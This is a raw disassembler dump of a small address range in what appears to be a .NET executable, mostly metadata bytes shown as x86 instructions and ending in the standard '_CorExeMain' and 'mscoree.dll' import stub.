  40cfcc:	0c 06                	or     $0x6,%al
  40cfce:	00 01                	add    %al,(%ecx)
  40cfd0:	0a 11                	or     (%ecx),%dl
  40cfd2:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cfd9:	04 00 01 
  40cfdc:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cfe1:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cfe5:	ad                   	lods   %ds:(%esi),%eax
  40cfe6:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40cfeb:	0c 07                	or     $0x7,%al
  40cfed:	07                   	pop    %es
  40cfee:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40cff4:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40cff9:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40cfff:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d005:	12 60 1d             	adc    0x1d(%eax),%ah
  40d008:	0e                   	push   %cs
  40d009:	0e                   	push   %cs
  40d00a:	08 12                	or     %dl,(%edx)
  40d00c:	60                   	pusha
  40d00d:	08 05 07 01 12 81    	or     %al,0x81120107
  40d013:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d018:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d01f:	05 08 08 06 00       	add    $0x60808,%eax
  40d024:	02 07                	add    (%edi),%al
  40d026:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d02b:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d032:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d038:	00 02                	add    %al,(%edx)
  40d03a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d040:	02 0b                	add    (%ebx),%cl
  40d042:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d047:	02 06                	add    (%esi),%al
  40d049:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d04e:	02 0a                	add    (%edx),%cl
  40d050:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d055:	03 12                	add    (%edx),%edx
  40d057:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d05e:	07 02 12 
  40d061:	60                   	pusha
  40d062:	02 04 07             	add    (%edi,%eax,1),%al
  40d065:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d06b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d070:	04 1d                	add    $0x1d,%al
  40d072:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d077:	06                   	push   %es
  40d078:	07                   	pop    %es
  40d079:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d07f:	00 01                	add    %al,(%ecx)
  40d081:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d086:	06                   	push   %es
  40d087:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d08d:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d093:	05 08 20 02 01       	add    $0x1022008,%eax
  40d098:	12 61 11             	adc    0x11(%ecx),%ah
  40d09b:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d09f:	04 12                	add    $0x12,%al
  40d0a1:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0a8:	1d 05 00 
  40d0ab:	00 d4                	add    %dl,%ah
  40d0ad:	d0 00                	rolb   $1,(%eax)
	...
  40d0b7:	00 ee                	add    %ch,%dh
  40d0b9:	d0 00                	rolb   $1,(%eax)
  40d0bb:	00 00                	add    %al,(%eax)
  40d0bd:	20 00                	and    %al,(%eax)
	...
  40d0d3:	00 e0                	add    %ah,%al
  40d0d5:	d0 00                	rolb   $1,(%eax)
	...
  40d0df:	00 00                	add    %al,(%eax)
  40d0e1:	00 5f 43             	add    %bl,0x43(%edi)
  40d0e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40d0e5:	72 45                	jb     0x40d12c
  40d0e7:	78 65                	js     0x40d14e
  40d0e9:	4d                   	dec    %ebp
  40d0ea:	61                   	popa
  40d0eb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d0f2:	72 65                	jb     0x40d159
  40d0f4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d0f8:	6c                   	insb   (%dx),%es:(%edi)
  40d0f9:	00 00                	add    %al,(%eax)
  40d0fb:	00 00                	add    %al,(%eax)
  40d0fd:	00 ff                	add    %bh,%bh
  40d0ff:	25 00 20 40 00       	and    $0x402000,%eax
